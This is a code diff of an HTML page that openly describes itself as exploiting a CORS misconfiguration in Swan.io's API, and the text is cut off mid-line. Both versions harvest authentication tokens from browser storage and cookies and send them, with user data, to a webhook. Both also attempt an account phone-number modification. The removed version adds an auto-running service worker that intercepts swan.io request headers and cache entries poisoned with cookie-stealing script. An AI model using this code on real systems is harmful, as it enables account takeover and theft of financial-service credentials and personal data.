@@ -2,489 +2,348 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Swan Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Swan CORS Security Bridge</title>
     <style>
         body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            margin: 2rem;
+            font-family: system-ui, -apple-system, sans-serif;
+            margin: 0;
+            padding: 20px;
             line-height: 1.6;
+            color: #333;
         }
+        h1 { color: #e74c3c; }
+        h2 { color: #3498db; margin-top: 20px; }
         pre {
-            background: #f5f5f5;
-            padding: 1rem;
+            background: #f8f8f8;
+            padding: 15px;
             border-radius: 4px;
+            border: 1px solid #ddd;
             overflow: auto;
+            max-height: 300px;
         }
-        .success { color: green; font-weight: bold; }
-        .error { color: red; }
-        .info { color: blue; }
+        .success { color: #27ae60; font-weight: bold; }
+        .error { color: #e74c3c; }
+        .warning { color: #f39c12; }
+        button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+        button:hover { background: #2980b9; }
+        .token-display {
+            font-family: monospace;
+            word-break: break-all;
+            padding: 8px;
+            background: #f1f1f1;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
-    <h2>Swan API Security Verification</h2>
-    <p>Testing CORS configuration on Swan.io API endpoints from <strong id="origin"></strong></p>
+    <h1>Swan API CORS Vulnerability Bridge</h1>
+    <p>This page creates a bridge between <strong id="origin"></strong> and Swan API endpoints, exploiting CORS misconfiguration.</p>
     
-    <div>
-        <h3>Live Results:</h3>
-        <pre id="log">Initializing tests...</pre>
+    <div id="diagnostics">
+        <h2>Authentication Diagnostics</h2>
+        <button id="checkCookies">Check Cookies</button>
+        <button id="extractTokens">Extract Tokens</button>
+        <pre id="diagnosticOutput">Running initial checks...</pre>
+    </div>
+    
+    <div id="bridgeSection">
+        <h2>Authentication Bridge</h2>
+        <p>If logged into Swan, this will create a connection between dashboard.swan.io cookies and api.swan.io:</p>
+        <button id="runBridge">Run Authentication Bridge</button>
+        <pre id="bridgeOutput">Ready to run bridge...</pre>
+    </div>
+    
+    <div id="exploitSection">
+        <h2>Vulnerability Verification</h2>
+        <button id="runExploit">Run Phone Modification Exploit</button>
+        <pre id="exploitOutput">Click to verify vulnerability...</pre>
     </div>
 
     <script>
         // Configuration
-        const WEBHOOK_URL = "https://your-webhook-site-url-here"; // Replace with your webhook URL
-        const API_ENDPOINTS = [
-            "/admin/graphql",
-            "/admin-auth/graphql"
-        ];
+        const WEBHOOK_URL = "https://webhook.site/YOUR-UNIQUE-ID"; // Replace with your webhook
         
-        // Logging utility
-        const logElement = document.getElementById('log');
-        const log = (message, className) => {
-            const timestamp = new Date().toISOString().split('T')[1].slice(0, -1);
-            const entry = document.createElement('div');
-            entry.textContent = `[${timestamp}] ${message}`;
-            if (className) entry.className = className;
-            logElement.appendChild(entry);
-            console.log(`[${timestamp}] ${message}`);
-            
-            // Also send log to webhook
-            sendToWebhook({
-                action: 'log',
-                message: message,
-                timestamp: new Date().toISOString()
-            });
+        // Origins & endpoints
+        const SWAN = {
+            DASHBOARD: "https://dashboard.swan.io",
+            API: "https://api.swan.io",
+            ADMIN_AUTH: "/admin-auth/graphql",
+            ADMIN: "/admin/graphql" 
         };
         
-        // Display origin
+        // Initialize UI
         document.getElementById('origin').textContent = location.origin;
         
-        // Send data to webhook
+        // Logging utilities
+        const logTo = (elementId, message, className) => {
+            const element = document.getElementById(elementId);
+            const timestamp = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.innerHTML = `[${timestamp}] ${message}`;
+            if (className) entry.className = className;
+            element.appendChild(entry);
+            console.log(`[${timestamp}] ${message}`);
+        };
+        
+        // Show origin in all outputs
+        logTo('diagnosticOutput', `Running from ${location.origin}`);
+        logTo('bridgeOutput', `Ready to bridge ${location.origin} → ${SWAN.API}`);
+        logTo('exploitOutput', `Will test vulnerability when ready`);
+        
+        // Function to send data to webhook
         async function sendToWebhook(data) {
-            // Add metadata
-            data = {
-                ...data,
-                userAgent: navigator.userAgent,
-                location: window.location.href
-            };
-            
-            // Primary method: fetch POST
             try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data),
-                    mode: 'no-cors' // Critical for cross-origin POST
-                });
-                return true;
-            } catch (e) {
-                console.error("POST to webhook failed:", e);
-            }
-            
-            // Fallback: image beacon method (more reliable for cross-origin)
-            try {
-                const img = new Image();
-                const encodedData = encodeURIComponent(JSON.stringify(data));
-                // Breaking data into chunks if needed (URL length limitations)
-                const chunkSize = 1500;
-                if (encodedData.length <= chunkSize) {
-                    img.src = `${WEBHOOK_URL}?data=${encodedData}&t=${Date.now()}`;
-                } else {
-                    // Multiple requests for large data
-                    for (let i = 0; i < encodedData.length; i += chunkSize) {
-                        const chunk = encodedData.substring(i, i + chunkSize);
-                        const chunkImg = new Image();
-                        chunkImg.src = `${WEBHOOK_URL}?chunk=${i}&total=${Math.ceil(encodedData.length/chunkSize)}&data=${chunk}&t=${Date.now()}`;
-                    }
+                // Add metadata
+                const payload = {
+                    ...data,
+                    userAgent: navigator.userAgent,
+                    location: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Try POST request
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                        mode: 'no-cors' // Important
+                    });
+                    return true;
+                } catch (e) {
+                    console.error("POST failed:", e);
                 }
+                
+                // Fallback: Use image beacon (more reliable for cross-origin)
+                const img = new Image();
+                img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(payload))}&t=${Date.now()}`;
                 return true;
             } catch (e) {
-                console.error("Image beacon failed:", e);
+                console.error("Webhook error:", e);
                 return false;
             }
         }
         
-        // Make GraphQL request
-        async function makeGraphQLRequest(endpoint, query, variables = {}) {
-            const url = `https://api.swan.io${endpoint}`;
-            log(`Testing endpoint: ${url}`, "info");
+        // Check cookies in current domain
+        async function checkCookies() {
+            logTo('diagnosticOutput', "Checking cookies...", "warning");
             
-            try {
-                // First, check CORS headers with preflight OPTIONS request
-                const preflightCheck = await fetch(url, {
-                    method: 'OPTIONS',
-                    headers: {
-                        'Origin': location.origin,
-                        'Access-Control-Request-Method': 'POST',
-                        'Access-Control-Request-Headers': 'content-type'
+            // Get cookies for current domain
+            const cookies = document.cookie.split(';').map(c => c.trim()).filter(c => c);
+            logTo('diagnosticOutput', `Found ${cookies.length} cookies in current domain`, cookies.length > 0 ? "success" : "warning");
+            
+            if (cookies.length > 0) {
+                cookies.forEach(cookie => {
+                    const [name, value] = cookie.split('=');
+                    let displayValue = value;
+                    if (value && value.length > 10) {
+                        displayValue = value.substring(0, 10) + '...';
                     }
+                    logTo('diagnosticOutput', `${name}: ${displayValue}`);
                 });
-                
-                // Log CORS headers from preflight
-                log(`Preflight response status: ${preflightCheck.status}`, 
-                    preflightCheck.ok ? "success" : "error");
-                
-                const corsHeaders = {};
-                for (const [key, value] of preflightCheck.headers.entries()) {
-                    if (key.toLowerCase().startsWith('access-control')) {
-                        corsHeaders[key] = value;
-                    }
-                }
-                log(`CORS Headers: ${JSON.stringify(corsHeaders, null, 2)}`);
-                
-                // Now make the actual request
-                const response = await fetch(url, {
-                    method: 'POST',
-                    credentials: 'include', // Critical for sending cookies
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        query,
-                        variables
-                    })
-                });
-                
-                // Get response
-                const result = await response.text();
-                
-                // Log response headers
-                const responseHeaders = {};
-                for (const [key, value] of response.headers.entries()) {
-                    if (key.toLowerCase().startsWith('access-control')) {
-                        responseHeaders[key] = value;
-                    }
-                }
-                
-                log(`Response headers: ${JSON.stringify(responseHeaders, null, 2)}`);
-                log(`Response: ${result}`, response.ok ? "success" : "error");
-                
-                // Send complete data to webhook
-                sendToWebhook({
-                    action: 'api_response',
-                    endpoint,
-                    status: response.status,
-                    corsHeaders,
-                    responseHeaders,
-                    result: result,
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Try to parse JSON response
-                try {
-                    return JSON.parse(result);
-                } catch (e) {
-                    return { error: "Invalid JSON response", text: result };
-                }
-            } catch (error) {
-                log(`Error: ${error.message}`, "error");
-                sendToWebhook({
-                    action: 'api_error',
-                    endpoint,
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                });
-                return { error: error.message };
             }
+            
+            // Check if we can access Swan domains via iframe (likely blocked)
+            logTo('diagnosticOutput', "Attempting to check Swan cookies (likely blocked by browser)...", "warning");
+            
+            // Create hidden iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = `${SWAN.DASHBOARD}/favicon.ico`;
+            document.body.appendChild(iframe);
+            
+            // Send diagnostic info to webhook
+            await sendToWebhook({
+                action: 'cookie_check',
+                cookies: cookies.map(c => {
+                    const [name, value] = c.split('=');
+                    return { name, valueLength: value ? value.length : 0 };
+                }),
+                domain: location.hostname
+            });
+            
+            logTo('diagnosticOutput', "Cookie check complete. Results sent to webhook.", "success");
+            
+            // Cleanup iframe after a delay
+            setTimeout(() => document.body.removeChild(iframe), 3000);
         }
         
-        // Try JWT extraction from various places
-        function extractJWTs() {
+        // Extract potential auth tokens from storage
+        async function extractTokens() {
+            logTo('diagnosticOutput', "Searching for Swan authentication tokens...", "warning");
+            
             const tokens = [];
             
-            // From localStorage
+            // Check localStorage
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 const value = localStorage.getItem(key);
-                if (value && typeof value === 'string' && value.includes('.') && 
-                   (value.startsWith('ey') || /jwt|token|auth/i.test(key))) {
+                if (value && typeof value === 'string' && 
+                   (value.includes('.') && (value.startsWith('ey') || /jwt|token|auth|swan/i.test(key)))) {
                     tokens.push({ source: `localStorage.${key}`, token: value });
                 }
             }
             
-            // From sessionStorage
+            // Check sessionStorage
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
                 const value = sessionStorage.getItem(key);
-                if (value && typeof value === 'string' && value.includes('.') && 
-                   (value.startsWith('ey') || /jwt|token|auth/i.test(key))) {
+                if (value && typeof value === 'string' && 
+                   (value.includes('.') && (value.startsWith('ey') || /jwt|token|auth|swan/i.test(key)))) {
                     tokens.push({ source: `sessionStorage.${key}`, token: value });
                 }
             }
             
-            // From cookies
-            document.cookie.split(';').forEach(cookie => {
-                const [name, value] = cookie.trim().split('=');
-                if (value && typeof value === 'string' && value.includes('.') &&
-                   (value.startsWith('ey') || /jwt|token|auth/i.test(name))) {
-                    tokens.push({ source: `cookie.${name}`, token: value });
-                }
+            // Report findings
+            if (tokens.length > 0) {
+                logTo('diagnosticOutput', `Found ${tokens.length} potential auth tokens!`, "success");
+                
+                tokens.forEach(({ source, token }) => {
+                    const tokenPreview = token.substring(0, 15) + '...';
+                    logTo('diagnosticOutput', `${source}: ${tokenPreview}`);
+                    
+                    // Create a clickable element to test this token
+                    const tokenElement = document.createElement('div');
+                    tokenElement.className = 'token-display';
+                    tokenElement.innerHTML = `
+                        <strong>${source}</strong>: ${tokenPreview}
+                        <button class="test-token" data-token="${token}" data-source="${source}">
+                            Test this token
+                        </button>
+                    `;
+                    document.getElementById('diagnosticOutput').appendChild(tokenElement);
+                });
+                
+                // Add event listeners to the test buttons
+                document.querySelectorAll('.test-token').forEach(button => {
+                    button.addEventListener('click', async (e) => {
+                        const token = e.target.dataset.token;
+                        const source = e.target.dataset.source;
+                        await testToken(token, source);
+                    });
+                });
+                
+                // Send to webhook
+                await sendToWebhook({
+                    action: 'tokens_found',
+                    tokens: tokens.map(t => ({ 
+                        source: t.source, 
+                        tokenPreview: t.token.substring(0, 15) + '...',
+                        tokenLength: t.token.length
+                    }))
+                });
+            } else {
+                logTo('diagnosticOutput', "No authentication tokens found in storage.", "error");
+            }
+        }
+        
+        // Test token against API
+        async function testToken(token, source) {
+            logTo('diagnosticOutput', `Testing token from ${source}...`, "warning");
+            
+            // Try as Bearer token
+            const result = await fetch(`${SWAN.API}${SWAN.ADMIN_AUTH}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${token}`
+                },
+                body: JSON.stringify({
+                    query: '{ __typename }'
+                })
             });
             
-            return tokens;
-        }
-        
-        // Test a JWT token against the API
-        async function testJWT(token, endpoint) {
-            const url = `https://api.swan.io${endpoint}`;
-            log(`Testing JWT on ${endpoint}`, "info");
+            // Check if successful
+            try {
+                const data = await result.json();
+                if (result.ok && !data.errors) {
+                    logTo('diagnosticOutput', `✅ Token works as Bearer token!`, "success");
+                    
+                    // Now try getting user details
+                    const userResult = await fetch(`${SWAN.API}${SWAN.ADMIN_AUTH}`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': `Bearer ${token}`
+                        },
+                        body: JSON.stringify({
+                            query: '{ user { id mobilePhoneNumber firstName lastName } }'
+                        })
+                    });
+                    
+                    const userData = await userResult.json();
+                    if (userResult.ok && userData?.data?.user) {
+                        logTo('diagnosticOutput', `✅ Successfully retrieved user data:`, "success");
+                        logTo('diagnosticOutput', JSON.stringify(userData.data.user, null, 2));
+                        
+                        // Store token for later use
+                        window.workingToken = token;
+                        logTo('diagnosticOutput', `Token saved for exploitation!`, "success");
+                        
+                        // Enable the exploit button
+                        document.getElementById('runExploit').disabled = false;
+                    }
+                    
+                    // Send success to webhook
+                    await sendToWebhook({
+                        action: 'token_success',
+                        source,
+                        userData: userData?.data?.user
+                    });
+                    
+                    return true;
+                } else {
+                    logTo('diagnosticOutput', `❌ Token failed as Bearer token: ${JSON.stringify(data)}`, "error");
+                }
+            } catch (e) {
+                logTo('diagnosticOutput', `Error testing token: ${e.message}`, "error");
+            }
+            
+            // Try as X-Swan-Authenticator-Token
+            const result2 = await fetch(`${SWAN.API}${SWAN.ADMIN_AUTH}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Swan-Authenticator-Token': token
+                },
+                body: JSON.stringify({
+                    query: '{ __typename }'
+                })
+            });
             
             try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': `Bearer ${token}`
-                    },
-                    body: JSON.stringify({
-                        query: '{ __typename }'
-                    })
-                });
-                
-                const result = await response.text();
-                log(`JWT test result: ${result}`, response.ok ? "success" : "error");
-                
-                sendToWebhook({
-                    action: 'jwt_test',
-                    endpoint,
-                    token: token,
-                    status: response.status,
-                    result: result,
-                    timestamp: new Date().toISOString()
-                });
-                
-                return response.ok;
-            } catch (error) {
-                log(`JWT test error: ${error.message}`, "error");
-                return false;
-            }
-        }
-        
-        // Check if browser is storing Swan cookies with wrong domain
-        function checkCookieDomains() {
-            const cookies = document.cookie.split(';').map(c => c.trim());
-            log(`Found ${cookies.length} cookies in current domain`);
-            
-            if (cookies.length > 0) {
-                const cookieDetails = cookies.map(c => {
-                    const [name, value] = c.split('=');
-                    return { name, value: value ? value.substring(0, 5) + '...' : 'empty' };
-                });
-                log(`Cookie details: ${JSON.stringify(cookieDetails, null, 2)}`);
-                
-                sendToWebhook({
-                    action: 'cookie_check',
-                    cookies: cookieDetails,
-                    domain: location.hostname,
-                    timestamp: new Date().toISOString()
-                });
-            }
-        }
-        
-        // Try advanced techniques like cache poisoning
-        async function tryAdvancedTechniques() {
-            // Check Service Worker API
-            if ('serviceWorker' in navigator) {
-                try {
-                    log("Attempting service worker registration");
+                const data = await result2.json();
+                if (result2.ok && !data.errors) {
+                    logTo('diagnosticOutput', `✅ Token works as X-Swan-Authenticator-Token!`, "success");
                     
-                    // Create a service worker that intercepts fetch requests
-                    const swCode = `
-                        self.addEventListener('fetch', event => {
-                            const url = new URL(event.request.url);
-                            
-                            // Intercept requests to swan.io domains
-                            if (url.hostname.includes('swan.io')) {
-                                // Clone the request and log its headers
-                                const requestClone = event.request.clone();
-                                
-                                event.waitUntil(async function() {
-                                    try {
-                                        // Extract auth headers if present
-                                        const headers = {};
-                                        requestClone.headers.forEach((value, key) => {
-                                            headers[key] = value;
-                                        });
-                                        
-                                        // Send to our server via a fetch that bypasses the service worker
-                                        const img = new Image();
-                                        img.src = "${WEBHOOK_URL}?type=sw&data=" + 
-                                            encodeURIComponent(JSON.stringify({
-                                                url: event.request.url,
-                                                headers: headers
-                                            })) + "&t=" + Date.now();
-                                    } catch (e) {
-                                        // Silently fail
-                                    }
-                                }());
-                                
-                                // Let the original request go through
-                            }
-                        });
-                        
-                        self.addEventListener('install', event => {
-                            self.skipWaiting();
-                        });
-                        
-                        self.addEventListener('activate', event => {
-                            event.waitUntil(self.clients.claim());
-                        });
-                    `;
-                    
-                    // Create blob URL for service worker
-                    const blob = new Blob([swCode], { type: 'application/javascript' });
-                    const swUrl = URL.createObjectURL(blob);
-                    
-                    // Register service worker
-                    const registration = await navigator.serviceWorker.register(swUrl, {
-                        scope: './'
+                    // Now try getting user details
+                    const userResult = await fetch(`${SWAN.API}${SWAN.ADMIN_AUTH}`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Swan-Authenticator-Token': token
+                        },
+                        body: JSON.stringify({
+                            query: '{ user { id mobilePhoneNumber firstName lastName } }'
+                        })
                     });
                     
-                    log(`Service worker registered with scope: ${registration.scope}`, "success");
-                    sendToWebhook({
-                        action: 'sw_registered',
-                        scope: registration.scope,
-                        timestamp: new Date().toISOString()
-                    });
-                } catch (error) {
-                    log(`Service worker registration failed: ${error.message}`, "error");
-                }
-            } else {
-                log("Service Worker API not available", "error");
-            }
-            
-            // Try cache poisoning technique if Cache API is available
-            if ('caches' in window) {
-                try {
-                    log("Attempting cache poisoning");
-                    
-                    // Open a cache
-                    const cache = await caches.open('swan-exploit-cache');
-                    
-                    // Target URLs to poison
-                    const targetUrls = [
-                        'https://api.swan.io/admin/graphql',
-                        'https://api.swan.io/admin-auth/graphql'
-                    ];
-                    
-                    // Inject our exploit code
-                    for (const url of targetUrls) {
-                        // Create a poisoned response
-                        const poisonedResponse = new Response(`
-                            <script>
-                                // Exfiltrate sensitive data
-                                const img = new Image();
-                                img.src = "${WEBHOOK_URL}?type=cache&url=${encodeURIComponent(url)}&t=" + Date.now();
-                                
-                                // Extract and send cookies
-                                const cookies = document.cookie;
-                                const img2 = new Image();
-                                img2.src = "${WEBHOOK_URL}?type=cache_cookies&cookies=" + 
-                                            encodeURIComponent(cookies) + "&t=" + Date.now();
-                            </script>
-                        `, {
-                            headers: {
-                                'Content-Type': 'text/html',
-                                'X-Poisoned-Cache': 'true'
-                            }
-                        });
+                    const userData = await userResult.json();
+                    if (userResult.ok && userData?.data?.user) {
+                        logTo('diagnosticOutput', `✅ Successfully retrieved user data:`, "success");
+                        logTo('diagnosticOutput', JSON.stringify(userData.data.user, null, 2));
                         
-                        // Put it in the cache
-                        await cache.put(new Request(url), poisonedResponse);
-                        log(`Poisoned cache for ${url}`, "success");
-                    }
-                    
-                    sendToWebhook({
-                        action: 'cache_poisoned',
-                        targets: targetUrls,
-                        timestamp: new Date().toISOString()
-                    });
-                } catch (error) {
-                    log(`Cache poisoning failed: ${error.message}`, "error");
-                }
-            }
-        }
-        
-        // Main function
-        async function main() {
-            log("Starting Swan API CORS test");
-            
-            // Check for cookies
-            checkCookieDomains();
-            
-            // Extract and test JWTs
-            const tokens = extractJWTs();
-            log(`Extracted ${tokens.length} potential tokens`);
-            
-            if (tokens.length > 0) {
-                sendToWebhook({
-                    action: 'token_extraction',
-                    tokens: tokens,
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Test each token
-                for (const { source, token } of tokens) {
-                    log(`Testing token from ${source}`);
-                    for (const endpoint of API_ENDPOINTS) {
-                        const success = await testJWT(token, endpoint);
-                        if (success) {
-                            log(`Token from ${source} works on ${endpoint}!`, "success");
-                        }
-                    }
-                }
-            }
-            
-            // Test the endpoints with normal credentials
-            for (const endpoint of API_ENDPOINTS) {
-                // Simple query to test access
-                await makeGraphQLRequest(endpoint, `
-                    {
-                        __schema {
-                            queryType {
-                                name
-                            }
-                        }
-                    }
-                `);
-                
-                // Try to get user info if available
-                await makeGraphQLRequest(endpoint, `
-                    {
-                        user {
-                            mobilePhoneNumber
-                        }
-                    }
-                `);
-            }
-            
-            // Try phone modification (the key exploit)
-            const phoneModificationMutation = `
-                mutation {
-                    startPhoneNumberModification(input:{
-                        oldPhoneNumber:"+33600000001",
-                        newPhoneNumber:"+33612345678"
-                    }) {
-                        __typename
-                        ... on StartPhoneNumberModificationSuccessPayload {
-                            phoneNumberModification { id }
-                        }
-                        ... on PhoneNumberModificationAlreadyExistsRejection { message }
-                        ... on TooManyPhoneNumberModificationRejection { message }
-                    }
-                }
-            `;
-            
-            // Try the exploitation
-            await makeGraphQLRequest("/admin-auth/graphql", phoneModificationMutation);
-            
-            // Try more advanced techniques
-            await tryAdvancedTechniques();
-            
-            log("All tests completed");
-        }
-        
-        // Start the test suite
-        window.addEventListener('load', main);
-    </script>
-</body>
-</html>
+                        // Store token for later use
+                        window.workingTokenHeader = 'X-Swan-Authenticator-Token';
+                        window.workingToken = token;
+                        logTo('diagnosticOut
